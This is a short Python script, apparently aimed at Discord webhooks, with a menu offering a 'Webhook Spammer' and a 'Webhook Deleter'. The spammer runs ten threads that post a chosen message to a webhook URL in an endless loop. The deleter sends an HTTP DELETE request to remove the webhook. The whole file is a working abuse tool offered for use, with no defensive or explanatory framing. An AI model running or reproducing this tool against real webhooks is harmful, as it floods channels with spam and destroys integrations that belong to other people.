import requests
import threading

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json"
}

THREADS = 10

def spam_webhook(webhook_url, message):
    
    session = requests.Session()
    payload = {"content": message}

    while True:
        try:
            response = session.post(webhook_url, json=payload, headers=HEADERS)

            if response.status_code == 204:
                print(f"[SUCCESS] Message sent to {webhook_url}")
            else:
                print(f"[ERROR] {response.status_code} - {response.text}")
        
        except Exception as e:
            print(f"[EXCEPTION] {str(e)}")

def delete_webhook(webhook_url):
    
    try:
        response = requests.delete(webhook_url, headers=HEADERS)
        if response.status_code in [200, 204]:
            print(f"[SUCCESS] Webhook deleted: {webhook_url}")
        else:
            print(f"[ERROR] Failed to delete {webhook_url} - {response.status_code}")
    except Exception as e:
        print(f"[EXCEPTION] {str(e)}")

def start_spam():
    
    webhook_url = input("Enter Webhook URL: ").strip()
    message = input("Enter Message Content: ").strip()

    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=spam_webhook, args=(webhook_url, message))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def start_delete():
    
    webhook_url = input("Enter Webhook URL to delete: ").strip()
    delete_webhook(webhook_url)

def main():
    
    print("\nSelect an option:")
    print("1) Webhook Spammer")
    print("2) Webhook Deleter")

    choice = input("> ").strip()

    if choice == "1":
        start_spam()
    elif choice == "2":
        start_delete()
    else:
        print("[ERROR] Invalid option. Please enter 1 or 2.")

if __name__ == "__main__":
    main()
